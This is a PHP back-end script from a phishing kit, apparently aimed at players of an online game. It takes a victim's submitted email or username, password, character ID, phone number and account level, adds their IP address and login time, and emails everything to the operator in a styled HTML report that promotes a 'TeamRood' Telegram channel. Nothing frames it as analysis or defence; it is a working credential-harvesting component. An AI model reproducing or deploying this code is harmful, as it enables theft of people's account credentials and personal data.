<?php
// Include necessary files
include 'system/setting.php'; // Include the setting file
include 'email.php'; // Include the email configuration file

// Retrieve form data
$email = $_POST['email'];
$password = $_POST['password'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$level = $_POST['level'];
$login = $_POST['login'];

// Get the user's IP address
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the login time
$loginTime = date('Y-m-d H:i:s');

// Check if any of the form fields are empty
if ($email == "" && $password == "" && $playid == "" && $phone == "" && $level == "" && $login == "") {
    // Redirect to index.php if any field is empty
    header("Location: index.php");
} else {
    // Prepare email content
    $subjek = "LEVEL $level | EMAIL $email | TYPE $login";
    $pesan = '
        <center>
        <div style="background: url(https://i.ibb.co/mcWB0ZT/Capture.jpg) no-repeat;border:2px solid black;background-size: 100% 100%; width: 294; height: 101px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
        <table border="1" bordercolor="#19233f" style="color:#000;border-radius:8px; border:3px solid black; border-collapse:collapse;width:100%;background:linear-gradient(90deg,gold,orange);">
            <tr>
                <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
                <th style="padding:3px;width: 65%; text-align: center;"><b>'.$email.'</th> 
            </tr>
            <tr>
                <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>PASSWORD</th>
                <th style="padding:3px;width: 65%; text-align: center;"><b>'.$password.'</th> 
            </tr>
            <tr>
                <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>CHARACTER ID</th>
                <th style="padding:3px;width: 65%; text-align: center;"><b>'.$playid.'</th> 
            </tr>
            <tr>
                <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
                <th style="padding:3px;width: 65%; text-align: center;"><b>'.$phone.'</th> 
            </tr>
            <tr>
                <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>ACCOUNT LEVEL</th>
                <th style="padding:3px;width: 65%; text-align: center;"><b>'.$level.'</th>
            </tr>
        </table>
        <div style="border:2px solid black;width: 294; font-weight:bold; height: 20px; background: linear-gradient(90deg,gold,orange); color: #000; padding: 10px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; text-align:center;">ADDITIONAL INFORMATION</div>
        <table border="1" bordercolor="#19233f" style="color:#000;border-radius:8px; border:3px solid black; border-collapse:collapse;width:100%;background:linear-gradient(90deg,gold,orange);">
            <tr>
                <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>LOGIN</th>
                <th style="padding:3px;width: 65%; text-align: center;"><b>'.$login.'</th> 
            </tr>
            <tr>
                <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>IP ADDRESS</th>
                <th style="padding:3px;width: 65%; text-align: center;"><b>'.$ipAddress.'</th> 
            </tr>
            <tr>
                <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>LOGIN TIME</th>
                <th style="padding:3px;width: 65%; text-align: center;"><b>'.$loginTime.'</th> 
            </tr>
        </table>
        <div style="border:2px solid black;width: 294; font-weight:bold; height: 20px; background: linear-gradient(90deg,gold,orange); color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">
            <a style="border:2px solid #000;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#0088CC;" href="https://t.me/TeamRood">TELEGRAM TeamRood</a>
        </div>
        <center>
    ';

    // Prepare email headers
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers .= ''.$sender.'' . "\r\n";

    // Send the email
    $kirim = mail($emailku, $subjek, $pesan, $headers);
}
?>
